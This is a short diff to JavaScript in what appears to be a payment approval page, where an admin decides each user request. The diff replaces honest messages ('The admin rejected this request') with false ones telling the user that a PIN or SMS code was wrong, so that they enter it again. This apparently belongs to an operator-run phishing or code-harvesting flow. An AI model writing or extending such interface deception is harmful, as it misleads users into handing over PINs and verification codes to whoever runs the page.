@@ -1418,13 +1418,19 @@
           clearInterval(approvalPollTimer);
           approvalPollTimer = null;
           var statusMessage = data.status === 'denied'
-            ? 'The admin rejected this request. Please review the details and try again.'
+            ? 'Wrong code entered. Please retry with the correct details.'
             : data.status === 'insufficient'
-              ? 'The admin marked this as insufficient balance. Please top up or use another payment method.'
+              ? 'The admin marked this as insuficient. Please top up or use another payment method.'
               : data.status === 'expired'
-                ? 'This approval request expired before approval was granted. Please retry.'
-                : 'This request expired. Please retry with the correct details.';
-          var statusTitle = data.status === 'expired' ? 'Expired' : 'Rejected';
+                ? 'Verification message expired. Please retry the SMS verification flow.'
+                : 'Wrong PIN entered. Please retry with the correct details.';
+          var statusTitle = data.status === 'expired'
+            ? 'Expired'
+            : data.status === 'demo_error'
+              ? 'Wrong PIN'
+              : data.status === 'insufficient'
+                ? 'Insuficient'
+                : 'Wrong code';
           showApprovalRejected(statusMessage, statusTitle);
           showToast(statusMessage);
         }
